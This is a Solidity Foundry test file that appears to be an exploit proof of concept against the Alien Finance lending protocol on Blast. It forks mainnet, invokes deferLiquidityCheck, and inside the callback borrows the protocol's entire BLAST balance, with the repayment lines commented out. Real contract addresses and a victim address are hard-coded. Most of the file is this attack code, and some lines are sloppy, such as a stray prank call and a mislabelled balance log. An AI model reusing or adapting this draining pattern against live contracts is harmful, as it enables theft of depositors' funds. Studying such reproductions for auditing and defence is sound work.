// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "forge-std/Test.sol";
import "./test/interfaces/IERC20.sol";


interface IAlienFinance {
    function isMarketListed(address market) external view returns (bool);
    function deferLiquidityCheck(address user, bytes memory data) external;
    function borrow(address from, address to, address asset, uint256 amount) external;
    function repay(address from, address to, address asset, uint256 amount) external;

}
interface IDeferLiquidityCheck {
    /**
     * @dev The callback function that deferLiquidityCheck will invoke.
     * @param data The arbitrary data that was passed in by the caller
     */
    function onDeferredLiquidityCheck(bytes memory data) external;
}
library PauseFlags {
    // function isTransferPaused(DataTypes.MarketConfig memory self) internal pure returns (bool) {
    //     return toBool(self.pauseFlags & ~PAUSE_TRANSFER_MASK);
    // }
}
library DataTypes {
    struct MarketConfig {
        bool isListed;
        uint8 pauseFlags;
    }
    struct Market {
        MarketConfig config;
    }
}

contract AliendefferTest is Test {
    using PauseFlags for DataTypes.MarketConfig;

    IAlienFinance private allien = IAlienFinance(0x02B7BF59e034529d90e2ae8F8d1699376Dd05ade);
    address public attacker;
    address public vict = 0xC234A06B337B223679a4EE76e325542C5BA9573E;
    IERC20 weth = IERC20(0x4300000000000000000000000000000000000004);
    IERC20 blast = IERC20(0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad);
    bool internal _isDeferredLiquidityCheck;
    // uint256 amount = blast.balanceOf(address(allien));

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 7525585);
        attacker = msg.sender;
        vm.deal(address(this), 10.1 ether);
        vm.prank(address(this));
        // deal(address(blast), address(this), 10 ether);
    }

    function testLoan() public {
        checkdefer();
        emit log_named_decimal_uint("new busd", blast.balanceOf(address(this)), 18);
    }

    function checkdefer() internal returns (bool) {
        require(IAlienFinance(allien).isMarketListed(address(blast)), "token not listed");

        if (!_isDeferredLiquidityCheck) {
            IAlienFinance(allien).deferLiquidityCheck(
                address(this), abi.encode(address(this), address(blast), blast.balanceOf(address(allien)))
            );
            _isDeferredLiquidityCheck = false;
        } else {
            _takeloan();
            // _repayloan();
        }

        return true;
    }
    function onDeferredLiquidityCheck(bytes memory data) external {
        require(msg.sender == address(allien), "untrusted message sender");
    (address account, address token, uint256 amount) = abi.decode(data, (address, address, uint256));

        _isDeferredLiquidityCheck = false;
        _takeloan();
        // _repayloan();
    }

    function _takeloan() internal {
        IAlienFinance(allien).borrow(address(this), address(this), address(blast), blast.balanceOf(address(allien)));
        // IAlienFinance(allien).repay(address(this), address(this), address(blast), blast.balanceOf(address(this)) -10);
    }

    // function _repayloan() internal {
    //     IAlienFinance(allien).repay(address(this), address(this), address(blast), blast.balanceOf(address(this)) -10);
    // }


}